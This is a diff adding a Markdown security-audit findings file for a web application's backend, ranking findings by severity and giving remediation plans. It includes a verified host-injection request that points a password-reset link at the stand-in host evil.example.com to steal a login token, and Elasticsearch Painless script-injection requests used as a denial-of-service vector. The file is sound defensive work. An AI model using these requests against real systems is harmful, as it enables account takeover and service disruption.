@@ -1,0 +1,212 @@
+# Security hardening — 2026-07
+
+Findings from a whole-codebase security analysis (2026-07-29) covering the
+backend HTTP surface, authentication/authorization, the LLM features, and
+deployment configuration.
+
+Branch: `hardening/security-critical-high`.
+
+Working order: **critical → high**, one commit per finding. Medium and low are
+tracked here but deliberately deferred until the critical/high set is closed.
+
+Status legend: `pending` · `in progress` · `fixed` · `wontfix` · `deferred`
+
+---
+
+## Critical
+
+### C1 — Password-reset host injection → account takeover
+
+**Status:** pending
+
+`webapp/src/clj/lipas/backend/handler.clj:900` → `core.clj:162`
+
+`POST /api/actions/request-password-reset` declares `:parameters {:body {:email
+string?}}` but the handler passes raw `body-params` into
+`core/send-password-reset-link!`, which reads `:reset-url` from it and builds
+the magic link as `(str url "?token=" token)`. Reitit coercion writes to
+`:parameters`, never `:body-params`, so the extra key is never validated.
+
+Verified live, unauthenticated:
+
+```
+POST /api/actions/request-password-reset
+{"email": "admin@lipas.fi", "reset-url": "https://evil.example.com/x"}
+→ 200; email sent to admin@lipas.fi containing
+  https://evil.example.com/x?token=<7-day login JWT>
+```
+
+`/actions/order-magic-link` already carries the correct defence — the
+`magic-link-login-url` domain whitelist in `schema/handler.cljc:103` with a
+regression test. `request-password-reset` was missed.
+
+**Fix:** closed body schema with `reset-url` typed as
+`handler-schema/magic-link-login-url`; read from `:parameters :body`. Mirror
+the `order-magic-link` whitelist test.
+
+### C2 — nREPL published on 0.0.0.0:7888
+
+**Status:** pending
+
+`webapp/src/clj/lipas/backend/config.clj:99`, `system.clj:71`,
+`docker-compose.yml:187` / `:202`
+
+The production `backend` container starts an unauthenticated nREPL server and
+compose publishes `'7888:7888'`, which binds all host interfaces. nREPL is
+unconditional arbitrary code execution in the backend JVM.
+
+**Accepted by the maintainer as by-design capability** — the prod host firewall
+blocks inbound 7888 and server access requires SSH over VPN; the REPL is
+reached through an SSH tunnel. Treated here as defence-in-depth only, not as an
+open hole.
+
+**Fix:** publish the port on host loopback only
+(`127.0.0.1:7888:7888`). The nREPL process itself must keep binding `0.0.0.0`
+*inside* the container — that is the container's own network namespace, and
+Docker's port publishing cannot reach a container-loopback listener. An SSH
+tunnel (`ssh -L 7888:localhost:7888 lipas-prod`) terminates on the host's
+loopback and therefore still works.
+
+---
+
+## High
+
+### H1 — Unauthenticated arbitrary Elasticsearch query execution
+
+**Status:** pending
+
+`handler.clj:840` → `core.clj:927` → `search.clj:520`
+
+`POST /api/actions/search` forwards `body-params` verbatim as the Elasticsearch
+`_search` body. Same passthrough in `query-finance-report`, `query-subsidies`,
+`create-sports-sites-report` (arbitrary `:search-query`), `search-schools`,
+`search-population`.
+
+Verified live, all unauthenticated, all HTTP 200:
+
+- `script_score` with a Painless `:source` — executed
+- `runtime_mappings` `{:script {:source "emit(42)"}}` + sum agg — returned
+  `2395302.0`, i.e. Painless ran once per document across the index
+- 5000-bucket terms aggregation — executed
+
+The indexed data is public open data, so disclosure is not the issue. Arbitrary
+Painless plus unbounded aggregation cardinality is a cheap anonymous CPU/heap
+DoS against the cluster the whole site depends on, and it leaves the deployment
+permanently exposed to Elasticsearch scripting sandbox CVEs.
+
+**Fix:** reject scripting constructs and cap result/aggregation sizes at the
+public handler boundary, leaving internally-constructed queries untouched.
+
+### H2 — Archived / deactivated users can still log in
+
+**Status:** pending
+
+`auth.clj:26`, `auth.clj:41`, `handler.clj:878`
+
+`user-status` is `[:enum "active" "archived"]`, `update-user-status!` writes it
+and `gdpr-remove-user!` sets it, but nothing reads it during authentication —
+not `basic-auth`, not `token-backend`, not `refresh-login`.
+
+Verified live: archived `admin@lipas.fi`, then `POST /api/actions/login` with
+the correct password returned **200 with a fresh 6h token**. So
+`/actions/update-user-status` — the admin "deactivate user" control — has no
+security effect, and a GDPR-archived user keeps renewing sessions via
+`refresh-login` indefinitely.
+
+**Fix:** reject non-`active` users in `auth/basic-auth` and in `refresh-login`.
+
+### H3 — Nothing structurally prevents a route from shipping unauthenticated
+
+**Status:** pending
+
+`middleware.clj:51`
+
+```clojure
+(fn [route-data _opts]
+  (if-let [required-privilege (:require-privilege route-data)]
+    ...gate...
+    {}))          ; no key ⇒ no middleware ⇒ fully public
+```
+
+Fail-open by omission. This is the structural root cause behind H4 and M1: a
+newly added route that forgets `:require-privilege` silently ships public, and
+nothing catches it.
+
+**Fix:** a test that walks the reitit router, enumerates every route, and
+asserts each is either in an explicit public allowlist or carries a privilege /
+auth middleware. A new route with no decision fails CI.
+
+### H4 — No auth-regression tests on the LLM endpoints
+
+**Status:** pending
+
+The gates are correct — `assistant-chat` / `assistant-escalate` require
+`:ai-assistant/use`, all PTV generation requires `:ptv/manage` — but no test
+asserts any of it. `assistant_test.clj` contains only pure-function unit tests
+and never goes through the HTTP stack.
+
+Privileged endpoints with no 401/403 test:
+
+| Group | Endpoints |
+|---|---|
+| LLM | `assistant-chat`, `assistant-escalate`, `generate-ptv-descriptions`, `generate-ptv-descriptions-from-data`, `generate-ptv-descriptions-batch`, `generate-ptv-service-descriptions`, `translate-to-other-langs` |
+| Admin | `GET /api/users`, `gdpr-remove-user`, `get-all-orgs`, `list-org-takeover-requests`, `approve-org-takeover`, `deny-org-takeover`, `create-org` (403 case), `remove-org-member`, `revoke-site-edit`, `save-help-data`, `save-help-draft`, `get-help-versions`, `get-help-version`, `save-loi`, `upload-utp-image` |
+
+40 other privileged endpoints already have explicit 401/403 tests (org
+management, jobs, PTV audit, workbench, impersonation, user management), so the
+gap is specific and closable.
+
+**Fix:** backfill 401 (no token) + 403 (wrong-privilege token) tests for every
+endpoint above.
+
+---
+
+## Medium — deferred
+
+| # | Finding | Location |
+|---|---|---|
+| M1 | Two privilege checks commented out, exposing the endpoints: `#_#_:require-privilege :analysis-tool/experimental` on `create-heatmap` / `get-heatmap-facets`; `search-lois` privilege commented out | `handler.clj:1421`, `:1437`, `:1312` |
+| M2 | Unauthenticated email sending + account enumeration; no rate limiting anywhere (`nginx` has no `limit_req`). `request-password-reset` returns 404 `:email-not-found` vs 200 → existence oracle; `order-magic-link` mail-bombing; `send-feedback` / `register` → ops inbox; `subscribe-newsletter` | `handler.clj:900`, `:975`, `:1254`, `:857`, `:1227` |
+| M3 | `upload-utp-image` is auth-only with no privilege, no content-type check, no size cap, no extension allowlist | `handler.clj:1276` |
+| M4 | LLM abuse controls thin: PTV LLM endpoints have no rate limit and unbounded input (`translate-to-other-langs` takes bare `:string` with no `:max`); assistant limiter is an in-process atom that resets on deploy, multiplies per instance, and never evicts | `ptv/handler.clj:87`, `assistant.clj:741` |
+| M5 | Stale crypto stack: `buddy/buddy 2.0.0` → buddy-core 1.4.0 / buddy-sign 2.2.0 / buddy-hashers 1.3.0 / `bcprov-jdk15on 1.58` (2017, EOL artifact line). JWT alg is correctly pinned to HS512, so no alg-confusion — this is dependency hygiene | `deps.edn` |
+| M6 | `ptv-read-access?` is not org-scoped: `:ptv/manage` for any single city grants read of any org's PTV data via the `fetch-ptv-*` endpoints, which take `:org-id` from the body | `ptv/handler.clj:12` |
+| M7 | No token revocation. Roles baked into the 6h JWT; magic-link tokens live 7 days; `reset-password` accepts any valid token (including an impersonation token) with no old-password check | `jwt.clj:20`, `handler.clj:910` |
+
+## Low — deferred
+
+| # | Finding | Location |
+|---|---|---|
+| L1 | `clojure.core/read-string` in `utils/->number` honours `*read-eval*`, so `#=(...)` evaluates. Every caller traced (`maintenance.clj` CLI, `analysis/*` ES data, `db/city.clj` JSONB keys) — **not reachable from HTTP today**. A landmine, not a hole; one-line fix to `clojure.edn/read-string` | `utils.cljc:85` |
+| L2 | 500 responses echo `(.getMessage e)` | `handler.clj:54` |
+| L3 | `:parameters {:lipas-id int?}` is not a valid reitit parameter kind, so no coercion runs on the two accessibility routes | `handler.clj:1149`, `:1160` |
+| L4 | `/api/swagger.json` and `/api/swagger-ui` are public and enumerate the whole internal admin API | `handler.clj:170`, `:1479` |
+| L5 | Bulk-ops authz denial returns 500, not 403 | `bulk_operations_test.clj:138` |
+| L6 | `docker-compose.yml` also publishes `8091:8091` on all host interfaces, bypassing nginx. Prod nginx reaches the backend over the compose network (`proxy.conf` → `http://backend`), so the host publish is unnecessary there; local dev uses `host.docker.internal:8091` and does need it | `docker-compose.yml:188`, `:203` |
+
+---
+
+## Verified sound (no action)
+
+Recorded so future review effort goes where it is needed:
+
+- **Site-save authorization.** `upsert-sports-site!` checks permissions against
+  both the stored revision and the submitted document, carries
+  `:owner-org-id` / `:edit-grants` forward server-side so they cannot be
+  injected to grant access, then separately authorizes any change to them.
+- **Org management authz** — org-scoped role contexts from the body,
+  re-authorization in the core layer, per-site re-checks in bulk ops,
+  GDPR-aware email gating on history endpoints. Well tested.
+- **No SQL injection.** Everything is hugsql / next.jdbc parameterized; the few
+  string-built statements are in migrations and CLI tooling.
+- **No XSS surface.** No `dangerouslySetInnerHTML` in the CLJS tree;
+  `react-markdown` without `rehype-raw`; `sanitize-answer-links` allowlists
+  `https?://` and `mailto:` and degrades everything else to plain text.
+- **No CSRF exposure.** Bearer-token-only auth, no cookies, so
+  `Access-Control-Allow-Origin: *` is not a vector.
+- **JWT algorithm pinned** to HS512 in both signing and verification.
+- **Impersonation** refuses self and privileged targets, 1h tokens,
+  `:impersonator` claim preserved across refresh so sessions cannot be
+  laundered, audit events on both users, tested.
+- **No secrets in git history.** `.env*` is ignored; the only `AUTH_KEY=` hits
+  in history are `***FILL_THIS***` in the sample file.
